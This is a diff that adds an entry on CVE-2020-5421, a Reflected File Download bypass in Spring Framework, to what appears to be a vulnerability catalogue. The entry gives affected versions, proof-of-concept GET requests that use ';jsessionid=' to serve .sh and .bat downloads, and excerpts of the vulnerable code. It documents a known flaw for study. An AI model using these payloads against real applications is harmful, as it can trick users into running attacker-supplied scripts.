@@ -467,6 +467,44 @@ if (this.filename != null) {
 }
 ```
 
+### CVE-2020-5421 Reflected File Download
+Affected Version: < 5.2.8 or 5.1.17 or 5.0.18 or 4.3.28 Bypass CVE-2015-5211   
+Diff: https://github.com/spring-projects/spring-framework/commit/2281e421915627792a88acb64d0fea51ad138092  
+POC: 
+```
+GET /rfd/content?content=hello
+GET /rfd/;jsessionid=/content.sh?content=%23!%2Fbin%2Fbash%0Aid
+GET /rfd/;jsessionid=/content.bat?content=calc
+```
+Factor: 
+```
+org.springframework.web.servlet.mvc.method.annotation.AbstractMessageConverterMethodProcessor
+private static final Set<String> WHITELISTED_EXTENSIONS = new HashSet(Arrays.asList("txt", "text", "yml", "properties", "csv", "json", "xml", "atom", "rss", "png", "jpe", "jpeg", "jpg", "gif", "wbmp", "bmp")); //允许的safeExtension
+private static final Set<String> WHITELISTED_MEDIA_BASE_TYPES = new HashSet(Arrays.asList("audio", "image", "video")); 
+
+private void addContentDispositionHeader(ServletServerHttpRequest request, ServletServerHttpResponse response) {
+    String requestUri = rawUrlPathHelper.getOriginatingRequestUri(servletRequest);  // -> removeJsessionid绕过后续safeExtension校验
+    filename = decodingUrlPathHelper.decodeRequestString(servletRequest, filename);
+    String ext = StringUtils.getFilenameExtension(filename);
+    pathParams = decodingUrlPathHelper.decodeRequestString(servletRequest, pathParams);
+    String extInPathParams = StringUtils.getFilenameExtension(pathParams);
+    if (!this.safeExtension(servletRequest, ext) || !this.safeExtension(servletRequest, extInPathParams)) {
+	headers.add("Content-Disposition", "inline;filename=f.txt");
+    }
+}
+
+org.springframework.web.util.UrlPathHelper
+private String removeJsessionid(String requestUri) {
+    int startIndex = requestUri.toLowerCase().indexOf(";jsessionid=");
+    if (startIndex != -1) {
+        int endIndex = requestUri.indexOf(59, startIndex + 12);
+        String start = requestUri.substring(0, startIndex);
+        requestUri = endIndex != -1 ? start + requestUri.substring(endIndex) : start;
+    }
+    return requestUri;
+}
+```
+
 ## （9）Spring Integration Zip
 ### CVE-2018-1261 Arbitrary File Write
 Affected Version: < 1.0.1  
